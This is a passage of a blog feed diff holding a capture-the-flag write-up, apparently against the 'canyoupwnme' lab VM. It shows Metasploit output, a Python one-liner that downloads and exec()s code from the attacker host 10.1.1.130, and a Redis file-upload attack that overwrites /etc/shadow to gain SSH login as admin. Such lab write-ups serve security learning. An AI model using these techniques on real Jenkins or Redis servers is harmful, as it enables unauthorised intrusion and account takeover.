+</span><span class='line'>python -c <span class="p">&amp;</span>ldquo<span class="p">;</span>import urllib2<span class="p">;</span> <span class="nv">r</span> <span class="o">=</span> urllib2.urlopen<span class="o">(</span><span class="p">&amp;</span>lsquo<span class="p">;</span>&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://10.1.1.130:8080/z7UgcWwtF&quot;</span>&gt;http://10.1.1.130:8080/z7UgcWwtF&lt;/a&gt;<span class="p">&amp;</span>rsquo<span class="p">;</span><span class="o">)</span><span class="p">;</span> <span class="nb">exec</span><span class="o">(</span>r.read<span class="o">())</span><span class="p">;&amp;</span>rdquo<span class="p">;</span>
+</span><span class='line'><span class="o">[</span>&lt;/em&gt;<span class="o">]</span> 10.1.1.128       web_delivery - Delivering Payload
+</span><span class='line'><span class="o">[</span>&lt;em&gt;<span class="o">]</span> Sending stage <span class="o">(</span><span class="m">37475</span> bytes<span class="o">)</span> to 10.1.1.128
+</span><span class='line'><span class="o">[</span>&lt;/em&gt;<span class="o">]</span> Meterpreter session <span class="m">1</span> opened <span class="o">(</span>10.1.1.130:4444 -&gt; 10.1.1.128:36457<span class="o">)</span> at 2016-05-26 07:41:18 -0400&lt;/p&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;p&gt;msf exploit<span class="o">(</span>web_delivery<span class="o">)</span> &gt;
+</span><span class='line'>msf exploit<span class="o">(</span>web_delivery<span class="o">)</span> &gt; sessions -i 1&lt;/p&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;p&gt;meterpreter &gt; sysinfo
+</span><span class='line'>Computer     : canyoupwnme
+</span><span class='line'>OS           : Linux 3.19.0-25-generic <span class="c">#26~14.04.1-Ubuntu SMP Fri Jul 24 21:18:00 UTC 2015</span>
+</span><span class='line'>Architecture : i686
+</span><span class='line'>Meterpreter  : python/python
+</span><span class='line'>meterpreter &gt; ifconfig
+</span></code></pre></td></tr></table></div></figure></p>
+
+<p>Now Jenkins has been compromised~~</p>
+
+<h3>Vector 5: Redis file upload attack</h3>
+
+<p>Create a shadow file to overwrite target machine:</p>
+
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="p">&amp;</span>hellip<span class="p">;</span>truncate<span class="p">&amp;</span>hellip<span class="p">;</span>
+</span><span class='line'>debian-tor:*:16661:0:99999:7:::
+</span><span class='line'>admin:<span class="nv">$6$9sirPrQg$keedQFIOyFrljiwfiVUcs4HDZzEnEDRm08p9s9Gc</span>.IPEE75ipZ.6ZI0fWs5OLtcA4jXTtMAOmHy6iA2l7eksg1:16661:0:99999:7:::
+</span><span class='line'>user:<span class="nv">$6$9sirPrQg$keedQFIOyFrljiwfiVUcs4HDZzEnEDRm08p9s9Gc</span>.IPEE75ipZ.6ZI0fWs5OLtcA4jXTtMAOmHy6iA2l7eksg1:16661:0:99999:7:::
+</span><span class='line'>F4l13n:<span class="nv">$6$dZlaWry7$JLdKZhM8F9jH7b4Nr86fOZHVd</span>.1RTQ3VoqCCAP3iEv0rSJL8HVZ0saN89l/MdWjmbQ8Mskx2Q4g1u1kfu4AZI/:16661:0:99999:7:::
+</span><span class='line'>ftpuser:!:16679:0:99999:7:::
+</span><span class='line'><span class="p">&amp;</span>hellip<span class="p">;</span>truncate<span class="p">&amp;</span>hellip<span class="p">;</span>
+</span></code></pre></td></tr></table></div></figure></p>
+
+<p>Use metasploit payload to upload our shadow file to overwrite target machine.</p>
+
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>Module options <span class="o">(</span>auxiliary/scanner/redis/file_upload<span class="o">)</span>:&lt;/p&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;p&gt;   Name                    Current Setting        Required  Description&lt;/p&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;hr /&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;p&gt;   DISABLE_RDBCOMPRESSION  <span class="nb">true                   </span>yes       Disable compression when saving <span class="k">if</span> found to be enabled
+</span><span class='line'>   LocalFile               /var/www/html/shadow_  no        Local file to be uploaded
+</span><span class='line'>   Password                foobared               no        Redis password <span class="k">for</span> authentication <span class="nb">test</span>
+</span><span class='line'><span class="nb">   </span>RHOSTS                  10.1.1.128             yes       The target address range or CIDR identifier
+</span><span class='line'>   RPORT                   <span class="m">6379</span>                   yes       The target port
+</span><span class='line'>   RemoteFile              /etc/shadow            no        Remote file path
+</span><span class='line'>   THREADS                 <span class="m">1</span>                      yes       The number of concurrent threads&lt;/p&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;p&gt;msf auxiliary<span class="o">(</span>file_upload<span class="o">)</span> &gt; exploit&lt;/p&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;p&gt;<span class="o">[</span>+<span class="o">]</span> 10.1.1.128:6379 <span class="p">&amp;</span>ndash<span class="p">;</span> saved <span class="m">1103</span> bytes inside of redis DB at /etc/shadow
+</span><span class='line'><span class="o">[</span>&lt;em&gt;<span class="o">]</span> Scanned <span class="m">1</span> of <span class="m">1</span> hosts <span class="o">(</span>100% <span class="nb">complete</span><span class="o">)</span>
+</span><span class='line'><span class="o">[</span>&lt;/em&gt;<span class="o">]</span> Auxiliary module execution completed
+</span><span class='line'>msf auxiliary<span class="o">(</span>file_upload<span class="o">)</span> &gt;
+</span></code></pre></td></tr></table></div></figure></p>
+
+<p>and then SSH login to <code>user</code> or <code>admin</code> with the password we set.</p>
+
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# ssh -p <span class="m">1322</span> &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;&amp;#109;&amp;#x61;&amp;#105;&amp;#108;&amp;#x74;&amp;#111;&amp;#58;&amp;#x61;&amp;#100;&amp;#109;&amp;#105;&amp;#x6e;&amp;#64;&amp;#49;&amp;#x30;&amp;#x2e;&amp;#x31;&amp;#46;&amp;#49;&amp;#x2e;&amp;#x31;&amp;#x32;&amp;#56;&quot;</span>&gt;<span class="p">&amp;</span><span class="c">#x61;&amp;#x64;&amp;#109;&amp;#105;&amp;#110;&amp;#64;&amp;#x31;&amp;#48;&amp;#x2e;&amp;#49;&amp;#46;&amp;#x31;&amp;#x2e;&amp;#49;&amp;#x32;&amp;#56;&lt;/a&gt;&lt;/p&gt;</span>
+</span><span class='line'>
+</span><span class='line'>&lt;p&gt;  G:                ,<span class="p">;</span>                                          &lt;br/&gt;
+</span><span class='line'>  E#,    :        f#i                        .Gt  t    j.       &lt;br/&gt;
+</span><span class='line'>  E#t  .GE      .E#t                        j#W:  Ej   EW,      &lt;br/&gt;
+</span><span class='line'>  E#t j#K<span class="p">;</span>     i#W,     t      .DD.       <span class="p">;</span>K#f    E#,  E##j     &lt;br/&gt;
+</span><span class='line'>  E#GK#f      L#D.      EK:   ,WK.      .G#D.     E#t  E###D.   &lt;br/&gt;
+</span><span class='line'>  E##D.     :K#Wfff<span class="p">;</span>    E#t  i#D       j#K<span class="p">;</span>       E#t  E#jG#W<span class="p">;</span>  &lt;br/&gt;
+</span><span class='line'>  E##Wi     i##WLLLLt   E#t j#f      ,K#f   ,GD<span class="p">;</span>  E#t  E#t t##f &lt;br/&gt;
+</span><span class='line'>  E#jL#D:    .E#L       E#tL#i        j#Wi   E#t  E#t  E#t  :K#E:
+</span><span class='line'>  E#t ,K#j     f#E:     E#WW,          .G#D: E#t  E#t  E#KDDDD###i
+</span><span class='line'>  E#t   jD      ,WW<span class="p">;</span>    E#K:             ,K#fK#t  E#t  E#f,t#Wi,,,
+</span><span class='line'>  j#t            .D#<span class="p">;</span>   ED.                j###t  E#t  E#t  <span class="p">;</span><span class="c">#W:&lt;br/&gt;</span>
+</span><span class='line'>   ,<span class="p">;</span>              tt   t                   .G#t  E#t  DWi   ,KK:
+</span><span class='line'>                                              <span class="p">;;</span>  ,<span class="p">;</span>.&lt;/p&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;pre&gt;&lt;code&gt;                                               by canyoupwn.me
+</span><span class='line'>&lt;/code&gt;&lt;/pre&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;p&gt;&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;&amp;#109;&amp;#x61;&amp;#x69;&amp;#x6c;&amp;#x74;&amp;#x6f;&amp;#58;&amp;#97;&amp;#x64;&amp;#x6d;&amp;#105;&amp;#110;&amp;#64;&amp;#49;&amp;#48;&amp;#x2e;&amp;#x31;&amp;#46;&amp;#x31;&amp;#x2e;&amp;#x31;&amp;#50;&amp;#x38;&quot;</span>&gt;<span class="p">&amp;</span><span class="c">#97;&amp;#100;&amp;#x6d;&amp;#x69;&amp;#110;&amp;#64;&amp;#49;&amp;#48;&amp;#46;&amp;#x31;&amp;#x2e;&amp;#49;&amp;#46;&amp;#x31;&amp;#50;&amp;#56;&lt;/a&gt;&amp;rsquo;s password:</span>
+</span><span class='line'>Permission denied, please try again.
+</span><span class='line'>&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;&amp;#109;&amp;#x61;&amp;#x69;&amp;#108;&amp;#x74;&amp;#x6f;&amp;#x3a;&amp;#97;&amp;#100;&amp;#x6d;&amp;#x69;&amp;#x6e;&amp;#64;&amp;#x31;&amp;#x30;&amp;#46;&amp;#49;&amp;#46;&amp;#x31;&amp;#46;&amp;#49;&amp;#x32;&amp;#56;&quot;</span>&gt;<span class="p">&amp;</span><span class="c">#x61;&amp;#100;&amp;#109;&amp;#x69;&amp;#110;&amp;#x40;&amp;#x31;&amp;#x30;&amp;#x2e;&amp;#x31;&amp;#46;&amp;#x31;&amp;#46;&amp;#x31;&amp;#50;&amp;#x38;&lt;/a&gt;&amp;rsquo;s password:</span>
+</span><span class='line'>Welcome to Ubuntu 14.04.3 LTS <span class="o">(</span>GNU/Linux 3.19.0-25-generic i686<span class="o">)</span>&lt;/p&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;ul&gt;
+</span><span class='line'>&lt;li&gt;Documentation:  &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;https://help.ubuntu.com/&quot;</span>&gt;https://help.ubuntu.com/&lt;/a&gt;&lt;/li&gt;
+</span><span class='line'>&lt;/ul&gt;
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>&lt;p&gt;  System information as of Sat May <span class="m">28</span> 15:45:06 EEST 2016&lt;/p&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;p&gt;  System load:  0.0               Processes:           174
+</span><span class='line'>  Usage of /:   32.5% of 6.50GB   Users logged in:     1
+</span><span class='line'>  Memory usage: 30%               IP address <span class="k">for</span> eth0: 10.1.1.128
+</span><span class='line'>  Swap usage:   0%&lt;/p&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;p&gt;  Graph this data and manage this system at:
+</span><span class='line'>    &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;https://landscape.canonical.com/&quot;</span>&gt;https://landscape.canonical.com/&lt;/a&gt;&lt;/p&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;p&gt;151 packages can be updated.
+</span><span class='line'><span class="m">79</span> updates are security updates.&lt;/p&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;p&gt;Last login: Sat May <span class="m">28</span> 15:44:57 <span class="m">2016</span> from 10.1.1.130
+</span><span class='line'>admin@canyoupwnme:~<span class="nv">$ </span><span class="nb">exit</span>
+</span><span class='line'><span class="nb">logout</span>
+</span><span class='line'>Connection to 10.1.1.128 closed.
+</span></code></pre></td></tr></table></div></figure></p>
+
+<p>Now I can login as admin!</p>
+
+<!--- Reference -->
+
+
+
+]]></content>
+  </entry>
+  
+</feed>
